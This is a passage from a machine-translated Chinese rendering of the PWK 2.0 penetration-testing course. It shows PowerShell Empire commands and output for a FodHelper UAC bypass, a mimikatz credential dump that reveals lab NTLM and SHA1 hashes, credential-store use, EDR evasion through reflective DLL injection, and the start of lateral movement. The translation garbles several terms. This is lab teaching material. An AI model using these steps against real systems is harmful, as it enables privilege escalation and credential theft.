<div style="position:absolute;top:141709;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：powershell/privesc/bypassuac_fodhelper</font></font></nobr></div>
<div style="position:absolute;top:141726;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NeedsAdmin：错误</font></font></nobr></div>
<div style="position:absolute;top:141744;left:182"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OpsecSafe：错误</font></font></nobr></div>
<div style="position:absolute;top:141760;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语言：powershell</font></font></nobr></div>
<div style="position:absolute;top:141777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最小语言版本：2</font></font></nobr></div>
<div style="position:absolute;top:141794;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景：真实</font></font></nobr></div>
<div style="position:absolute;top:141811;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出扩展：无</font></font></nobr></div>
<div style="position:absolute;top:141845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：</font></font></nobr></div>
<div style="position:absolute;top:141862;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">彼得·梅多诺斯</font></font></nobr></div>
<div style="position:absolute;top:141896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:141913;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过执行注册表修改来绕过 UAC</font></font></nobr></div>
<div style="position:absolute;top:141930;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FodHelper（基于 https://winscripting.blog/2017/05/12</font></font></nobr></div>
<div style="position:absolute;top:141947;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/first-entry-welcome-and-uac-bypass/)</font></font></nobr></div>
<div style="position:absolute;top:141981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注释：</font></font></nobr></div>
<div style="position:absolute;top:141998;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://winscripting.blog/2017/05/12/first-entry-welcome-</font></font></nobr></div>
<div style="position:absolute;top:142015;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和-uac-bypass/</font></font></nobr></div>
<div style="position:absolute;top:142049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></nobr></div>
<div style="position:absolute;top:142083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 必填值    </font></font></nobr></div>
<div style="position:absolute;top:142083;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述</font></font></nobr></div>
<div style="position:absolute;top:142100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- -------- -------    </font></font></nobr></div>
<div style="position:absolute;top:142100;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------</font></font></nobr></div>
<div style="position:absolute;top:142117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听者真    </font></font></nobr></div>
<div style="position:absolute;top:142117;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要使用的侦听器。    </font></font></nobr></div>
<div style="position:absolute;top:142134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UserAgent False 默认    </font></font></nobr></div>
<div style="position:absolute;top:142134;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于登台的用户代理字符串</font></font></nobr></div>
<div style="position:absolute;top:142151;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求（默认、无或其他）。    </font></font></nobr></div>
<div style="position:absolute;top:142168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理 False 默认    </font></font></nobr></div>
<div style="position:absolute;top:142168;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于请求的代理（默认，无，</font></font></nobr></div>
<div style="position:absolute;top:142185;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或其他）。    </font></font></nobr></div>
<div style="position:absolute;top:142201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特工真    </font></font></nobr></div>
<div style="position:absolute;top:142201;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S2Y5XW1L    </font></font></nobr></div>
<div style="position:absolute;top:142201;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要在其上运行模块的代理。    </font></font></nobr></div>
<div style="position:absolute;top:142218;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyCreds False 默认    </font></font></nobr></div>
<div style="position:absolute;top:142218;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理凭据    </font></font></nobr></div>
<div style="position:absolute;top:142236;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">([domain\]username:password) 用于 </font></font></nobr></div>
<div style="position:absolute;top:142253;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求（默认、无或其他）。    </font></font></nobr></div>
<div style="position:absolute;top:142286;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: powershell/privesc/bypassuac_fodhelper) &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置监听器 http</font></font></font></b></nobr></div>
<div style="position:absolute;top:142320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/privesc/bypassuac_fodhelper）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:142337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[&gt;] 模块不是 opsec 安全的，运行？</font><font style="vertical-align: inherit;">[Y / N] </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ÿ</font></font></font></b></nobr></div>
<div style="position:absolute;top:142371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/privesc/bypassuac_fodhelper）&gt; </font></font></nobr></div>
<div style="position:absolute;top:142388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作开始：4STVDU</font></font></nobr></div>
<div style="position:absolute;top:142405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 来自 10.11.0.22 的初始代理 K678VC13 现在处于活动状态（Slack）</font></font></nobr></div>
<div style="position:absolute;top:142439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/privesc/bypassuac_fodhelper）&gt; </font></font></nobr></div>
<div style="position:absolute;top:142459;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 839 - 使用 PowerShell Empire 绕过 UAC</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们有一个高完整性的会话，我们就可以执行需要本地管理员或</font></font></nobr></div>
<div style="position:absolute;top:142507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统权限，例如执行 mimikatz 以转储缓存的凭据。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：特工）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">互动 K678VC13</font></font></font></b></nobr></div>
<div style="position:absolute;top:142576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: K678VC13) &gt; 使用</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块凭证/</font></font></font></b></nobr></div>
<div style="position:absolute;top:142593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">credential_injection* mimikatz/extract_tickets mimikatz/sam*</font></font></nobr></div>
<div style="position:absolute;top:142610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">enum_cred_store    </font></font></nobr></div>
<div style="position:absolute;top:142610;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz/golden_ticket mimikatz/silver_ticket </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:142735;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="121"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 121 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:142768;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:143845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:143845;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:143845;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">738</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">invoke_kerberoast    </font></font></nobr></div>
<div style="position:absolute;top:142864;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿/钥匙*    </font></font></nobr></div>
<div style="position:absolute;top:142864;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz/trust_keys*</font></font></nobr></div>
<div style="position:absolute;top:142880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿/缓存*    </font></font></nobr></div>
<div style="position:absolute;top:142880;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz/登录密码* powerdump*</font></font></nobr></div>
<div style="position:absolute;top:142897;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿/证书*    </font></font></nobr></div>
<div style="position:absolute;top:142897;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz/lsadump*    </font></font></nobr></div>
<div style="position:absolute;top:142897;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sessiongopher</font></font></nobr></div>
<div style="position:absolute;top:142914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿/命令*    </font></font></nobr></div>
<div style="position:absolute;top:142914;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz/mimitokens* 代币</font></font></nobr></div>
<div style="position:absolute;top:142932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿/直流同步    </font></font></nobr></div>
<div style="position:absolute;top:142932;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模仿/pth*    </font></font></nobr></div>
<div style="position:absolute;top:142932;left:530"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vault_credential*</font></font></nobr></div>
<div style="position:absolute;top:142948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz/dcsync_hashdump mimikatz/清除    </font></font></nobr></div>
<div style="position:absolute;top:142968;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 840 - PowerShell Empire 中的 Mimikatz</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 840 中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭证</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别包含多个 mimikatz 命令，这些命令已被</font></font></nobr></div>
<div style="position:absolute;top:143016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">移植到帝国。</font><font style="vertical-align: inherit;">标有星号的命令需要高度完整的 Empire 代理。</font></font></nobr></div>
<div style="position:absolute;top:143049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Empire 使用反射 DLL 注入</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">728</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 mimikatz 库直接从</font></font></nobr></div>
<div style="position:absolute;top:143069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记忆。</font></font></nobr></div>
<div style="position:absolute;top:143101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以这种方式加载我们的恶意可执行文件可以最大限度地降低检测风险，因为大多数 EDR</font></font></nobr></div>
<div style="position:absolute;top:143121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">解决方案只分析存储在硬盘驱动器上的文件。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:143183;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此方法是自定义编码到代理中的，因为 Windows 不公开任何</font></font></i></nobr></div>
<div style="position:absolute;top:143202;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">官方 API（类似于 LoadLibrary）可以让我们实现相同的目标</font></font></i></nobr></div>
<div style="position:absolute;top:143222;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客观的。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:143284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们来看看</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">logonpasswords</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等高完整性访问模块</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:143319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: K678VC13) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">usemodule credentials/mimikatz/logonpasswords</font></font></font></b></nobr></div>
<div style="position:absolute;top:143352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：powershell/credentials/mimikatz/logonpasswords）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行</font></font></font></b></nobr></div>
<div style="position:absolute;top:143369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业开始：NXK271</font></font></nobr></div>
<div style="position:absolute;top:143404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机名：client251.corp.com / S-1-5-21-3048852426-3234707088-723452474</font></font></nobr></div>
<div style="position:absolute;top:143437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz(powershell) # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sekurlsa::logonpasswords</font></font></font></b></nobr></div>
<div style="position:absolute;top:143471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份验证 ID : 0 ; </font><font style="vertical-align: inherit;">244851 (00000000:0003bc73)</font></font></nobr></div>
<div style="position:absolute;top:143488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议    </font></font></nobr></div>
<div style="position:absolute;top:143488;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 互动从 1</font></font></nobr></div>
<div style="position:absolute;top:143505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名    </font></font></nobr></div>
<div style="position:absolute;top:143505;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 关</font></font></nobr></div>
<div style="position:absolute;top:143522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域    </font></font></nobr></div>
<div style="position:absolute;top:143522;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 公司</font></font></nobr></div>
<div style="position:absolute;top:143539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录服务器：DC01</font></font></nobr></div>
<div style="position:absolute;top:143556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录时间    </font></font></nobr></div>
<div style="position:absolute;top:143556;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 2/20/2019 晚上 10:36:32</font></font></nobr></div>
<div style="position:absolute;top:143573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:143573;left:255"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: S-1-5-21-3048852426-3234707088-723452474-1103</font></font></nobr></div>
<div style="position:absolute;top:143590;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微信：   </font></font></nobr></div>
<div style="position:absolute;top:143607;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[00000003] 初级</font></font></nobr></div>
<div style="position:absolute;top:143624;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 用户名：offsec</font></font></nobr></div>
<div style="position:absolute;top:143641;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 域名：公司</font></font></nobr></div>
<div style="position:absolute;top:143658;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* NTLM：e2b475c11da2a0748290d87aa966c327</font></font></nobr></div>
<div style="position:absolute;top:143675;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* SHA1：8c77f430e4ab8acb10ead387d64011c76400d26e</font></font></nobr></div>
<div style="position:absolute;top:143692;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* DPAPI：c10c264a27b63c4e66728bbef4be8aab</font></font></nobr></div>
<div style="position:absolute;top:143709;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">茶匙： </font></font></nobr></div>
<div style="position:absolute;top:143726;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">摘要：   </font></font></nobr></div>
<div style="position:absolute;top:143743;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 用户名：offsec</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:143795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">728 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（斯蒂芬较少，2013），https://github.com/stephenfewer/ReflectiveDLLInjection</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:143923;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="122"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 122 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:143956;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:145033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:145033;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:145033;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">739</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144052;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 域名：公司</font></font></nobr></div>
<div style="position:absolute;top:144068;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 密码：（空）</font></font></nobr></div>
<div style="position:absolute;top:144085;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核：  </font></font></nobr></div>
<div style="position:absolute;top:144102;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 用户名：offsec</font></font></nobr></div>
<div style="position:absolute;top:144120;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 域名：CORP.COM</font></font></nobr></div>
<div style="position:absolute;top:144136;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 密码：（空）</font></font></nobr></div>
<div style="position:absolute;top:144153;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssp :   </font></font></nobr></div>
<div style="position:absolute;top:144170;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">克雷德曼：   </font></font></nobr></div>
<div style="position:absolute;top:144187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:144207;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 841 - 从 PowerShell Empire 执行 mimikatz</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此输出与 mimikatz 相同，但收集的凭据也写入凭据</font></font></nobr></div>
<div style="position:absolute;top:144256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">store，可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（帝国：K678VC13）&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds</font></font></font></b></nobr></div>
<div style="position:absolute;top:144324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书：</font></font></nobr></div>
<div style="position:absolute;top:144358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CredID CredType 域用户名主机    </font></font></nobr></div>
<div style="position:absolute;top:144358;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></nobr></div>
<div style="position:absolute;top:144375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">————————————————————————    </font></font></nobr></div>
<div style="position:absolute;top:144375;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------</font></font></nobr></div>
<div style="position:absolute;top:144392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 hash corp.com offsec client251 e2b475c11da2a0748290d87aa966c32</font></font></nobr></div>
<div style="position:absolute;top:144409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 hash corp.com CLIENT251$ client251 4d4ae0e7cb16d4cfe6a91412b3d80ed</font></font></nobr></div>
<div style="position:absolute;top:144429;left:377"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 842 - 凭证存储</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds add</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动将数据输入到凭证存储中，</font><font style="vertical-align: inherit;">如清单 843 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Empire: K678VC13) &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creds add corp.com jeff_admin Qwerty09！</font></font></font></b></nobr></div>
<div style="position:absolute;top:144527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书：</font></font></nobr></div>
<div style="position:absolute;top:144561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CredID CredType 域用户名主机    </font></font></nobr></div>
<div style="position:absolute;top:144561;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></nobr></div>
<div style="position:absolute;top:144577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">————————————————————————    </font></font></nobr></div>
<div style="position:absolute;top:144577;left:554"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------</font></font></nobr></div>
<div style="position:absolute;top:144595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 hash corp.com offsec client251 e2b475c11da2a0748290d87aa966c32</font></font></nobr></div>
<div style="position:absolute;top:144612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2 hash corp.com CLIENT251$ client251 4d4ae0e7cb16d4cfe6a91412b3d80ed</font></font></nobr></div>
<div style="position:absolute;top:144629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3 明文 corp.com    </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jeff_admin    </font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:144629;left:554"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Qwerty09！</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:144648;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 843 - 将凭证添加到凭证存储中</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:144679;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">23.2.3</font></font></i></nobr></div>
<div style="position:absolute;top:144679;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">横向运动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:144717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们获得有效的用户凭据，我们就可以使用它们登录其他系统，直到我们到达</font></font></nobr></div>
<div style="position:absolute;top:144736;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的目标。</font><font style="vertical-align: inherit;">这被称为横向运动。</font></font></nobr></div>
<div style="position:absolute;top:144769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的实验室中，域控制器位于内部网络上，这意味着我们无法访问它</font></font></nobr></div>
<div style="position:absolute;top:144788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自我们的 Kali VM。</font><font style="vertical-align: inherit;">为了演示 Empire 中横向移动的机制，我们将获得</font></font></nobr></div>
<div style="position:absolute;top:144808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在不同用户的上下文中 Windows 10 客户端上的另一个 shell。</font></font></nobr></div>
<div style="position:absolute;top:144841;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这个例子因为单一目标虚拟机而被简化，但过程的机制</font></font></nobr></div>
<div style="position:absolute;top:144860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在实际情况下移动到不同的远程主机时将是相同的。</font></font></nobr></div>
<div style="position:absolute;top:144893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lateral_movement</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别中</font><font style="vertical-align: inherit;">有各种向量</font><font style="vertical-align: inherit;">，我们可以使用它们来调用一个 Empire</font></font></nobr></div>
<div style="position:absolute;top:144912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程主机上的代理：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
